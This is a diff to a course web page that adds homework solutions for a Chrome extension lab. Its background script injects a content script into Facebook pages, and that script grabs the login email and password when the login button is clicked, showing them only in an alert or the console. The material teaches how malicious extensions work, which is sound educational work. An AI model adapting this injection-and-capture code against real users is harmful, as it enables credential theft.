@@ -20,6 +20,9 @@
         ol {
            font-weight: normal;
         }
+        p {
+           font-weight: normal;
+        }
         .ans {
             text-indent: 2em; 
             display: block;
@@ -228,6 +231,34 @@ done</code></pre></p>
             </ol>
             <br/>
 
+            <h2 style="text-decoration: underline">Homework Part 2 Solutions: Chrome Extension</h2>
+            <br />
+            <p>"background.js" can look like this:</p>
+            <pre class="prettyprint lang-js">
+<code>chrome.tabs.onUpdated.addListener( function ( tabId, changeInfo, tab ) {
+   if ( tab.status == "complete" && tab.url.indexOf( "facebook" ) != -1 ) {
+      chrome.tabs.executeScript( tabId, { file: "fakeFacebook.js" } );
+   }
+} );</code></pre>
+<br/>
+            <p>There are many ways to complete this part of the homework, but here are a couple possiblities for "fakeFacebook.js":</p>
+            <pre class="prettyprint lang-js">
+<code>var div = document.getElementById( &quot;loginbutton&quot; );
+
+if ( div ) {
+   div.innerHTML = &#39;&lt;input value=&quot;Log In&quot; tabindex=&quot;4&quot; type=&quot;submit&quot; id=&quot;u_0_n&quot; onclick=&quot;var email=document.getElementById(\&#39;email\&#39;).value;var pass=document.getElementById(\&#39;pass\&#39;).value;alert(\&#39;Email = \&#39; + email + \&#39; ::::: Password = \&#39; + pass);&quot;&gt;&#39;;
+}</code></pre>
+<p>or...</p>
+<pre class="prettyprint lang-js">
+<code>var email = document.getElementById( &quot;email&quot; );
+var password = document.getElementById(&quot;pass&quot;);
+var login = document.getElementById( &quot;u_0_n&quot; );
+
+login.onclick = function()
+{ 
+    console.log(email);
+    alert( &quot;username: &quot; + email.value + &quot;\nPassword: &quot; + password.value + &quot;\n&quot; );
+};</code></pre>
         </div>
     </div>
     <!-- /.container -->
